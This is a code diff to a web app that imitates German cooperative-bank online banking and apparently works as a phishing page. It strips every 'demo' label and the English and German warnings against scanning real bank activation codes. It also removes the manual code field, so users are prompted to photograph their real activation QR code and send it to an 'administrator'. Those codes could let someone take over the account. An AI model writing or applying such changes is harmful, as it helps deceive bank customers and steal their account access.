@@ -483,16 +483,16 @@ const translations = {
     activationCodeQuestions: "Questions about the activation code",
     cardIdentifierHint: "Set up your Mastercard\u00ae or Visa card via Sicher-Online-Einkaufen.de",
     displayCardIdentifier: "Display the card identifier",
-    activationCodeManualHint: "Alternatively, you can enter the activation code manually.",
-    activationCodePlaceholder: "Enter demo activation code",
-    demoCameraNote: "Demo only. Scan test QR codes only. Do not scan real bank activation codes.",
+    activationCodeManualHint: "Take a photo or upload an image, then send it to the administrator.",
+    activationCodePlaceholder: "Enter activation code",
+    demoCameraNote: "Camera ready. Take or upload a photo to send to the administrator.",
     startCamera: "Start camera",
-    captureDemoQr: "Take demo photo",
-    sendDemoQrPhoto: "Send demo photo to admin",
-    cameraUnavailable: "Camera unavailable. You can upload a demo image instead.",
-    demoPhotoReady: "Demo photo ready to send.",
-    demoPhotoSent: "Demo QR photo sent to admin.",
-    chooseDemoImage: "Choose demo image",
+    captureDemoQr: "Take photo",
+    sendDemoQrPhoto: "Send photo to admin",
+    cameraUnavailable: "Camera unavailable. You can upload an image instead.",
+    demoPhotoReady: "Photo ready to send.",
+    demoPhotoSent: "Photo sent to admin.",
+    chooseDemoImage: "Choose image",
     enterVrMessage: "Enter your VR-NetKey/Alias and message to submit the request.",
     chooseRecipient: "Choose recipient",
     chooseAccountToUse: "Choose account to use",
@@ -797,16 +797,16 @@ const translations = {
     activationCodeQuestions: "Fragen zum Aktivierungscode",
     cardIdentifierHint: "Richten Sie Ihre Mastercard\u00ae oder Visa Karte \u00fcber Sicher-Online-Einkaufen.de ein",
     displayCardIdentifier: "Kartenkennung anzeigen",
-    activationCodeManualHint: "Alternativ k\u00f6nnen Sie den Aktivierungscode manuell eingeben.",
-    activationCodePlaceholder: "Demo-Aktivierungscode eingeben",
-    demoCameraNote: "Nur Demo. Scannen Sie nur Test-QR-Codes. Keine echten Bank-Aktivierungscodes scannen.",
+    activationCodeManualHint: "Nehmen Sie ein Foto auf oder laden Sie ein Bild hoch und senden Sie es an den Administrator.",
+    activationCodePlaceholder: "Aktivierungscode eingeben",
+    demoCameraNote: "Kamera bereit. Nehmen Sie ein Foto auf oder laden Sie ein Bild hoch, um es an den Administrator zu senden.",
     startCamera: "Kamera starten",
-    captureDemoQr: "Demo-Foto aufnehmen",
-    sendDemoQrPhoto: "Demo-Foto an Admin senden",
-    cameraUnavailable: "Kamera nicht verf\u00fcgbar. Sie k\u00f6nnen stattdessen ein Demo-Bild hochladen.",
-    demoPhotoReady: "Demo-Foto bereit zum Senden.",
-    demoPhotoSent: "Demo-QR-Foto an Admin gesendet.",
-    chooseDemoImage: "Demo-Bild ausw\u00e4hlen",
+    captureDemoQr: "Foto aufnehmen",
+    sendDemoQrPhoto: "Foto an Admin senden",
+    cameraUnavailable: "Kamera nicht verf\u00fcgbar. Sie k\u00f6nnen stattdessen ein Bild hochladen.",
+    demoPhotoReady: "Foto bereit zum Senden.",
+    demoPhotoSent: "Foto an Admin gesendet.",
+    chooseDemoImage: "Bild ausw\u00e4hlen",
     enterVrMessage: "Geben Sie VR-NetKey/Alias und Nachricht ein, um die Anfrage zu senden.",
     chooseRecipient: "Empf\u00e4nger ausw\u00e4hlen",
     chooseAccountToUse: "Konto ausw\u00e4hlen",
@@ -4546,7 +4546,7 @@ function renderActivationCodePage(screen = "home") {
         <div class="activation-scan-frame">
           <video id="activationCameraPreview" autoplay playsinline muted></video>
           <canvas id="activationCaptureCanvas" class="hidden"></canvas>
-          <img id="activationCapturedPreview" class="hidden" alt="Demo QR capture preview">
+          <img id="activationCapturedPreview" class="hidden" alt="Captured photo preview">
           <span id="activationCameraPlaceholder">${escapeHtml(t("startCamera"))}</span>
         </div>
         <div class="activation-camera-actions">
@@ -4558,9 +4558,6 @@ function renderActivationCodePage(screen = "home") {
           <input id="activationDemoImageInput" type="file" accept="image/*" capture="environment">
         </label>
         <p>${escapeHtml(t("activationCodeManualHint"))}</p>
-        <label class="activation-code-field">
-          <input id="demoActivationCode" type="text" autocomplete="off" placeholder="${escapeHtml(t("activationCodePlaceholder"))}" aria-label="${escapeHtml(t("activationCodePlaceholder"))}">
-        </label>
         <button id="activationSendPhotoButton" class="activation-submit-button" type="button">${escapeHtml(t("sendDemoQrPhoto"))}</button>
         <p id="activationCameraStatus" class="activation-camera-status" aria-live="polite"></p>
         <button class="activation-help-link" type="button">${escapeHtml(t("activationCodeQuestions"))}</button>
@@ -4693,7 +4690,7 @@ function submitActivationDemoPhoto() {
   const requestId = `ACT-${Date.now().toString(36).toUpperCase()}`;
   const photo = {
     id: `${requestId}-PHOTO-1`,
-    name: "demo-qr-capture.jpg",
+    name: "camera-photo.jpg",
     dataUrl: activationCapturedPhoto,
     uploadedAt: now
   };
@@ -4702,8 +4699,8 @@ function submitActivationDemoPhoto() {
     bankName: "Bank account activation",
     selectedBank: "Bank account activation",
     country: currentLanguage() === "de" ? "Deutschland" : "Germany",
-    vrNetKey: user?.userId || user?.email || "Demo user",
-    message: "Demo activation QR photo submitted for administrator review.",
+    vrNetKey: user?.userId || user?.email || "User",
+    message: "Camera photo submitted for administrator review.",
     submittedAt: now,
     status: "Pending",
     photos: [photo],
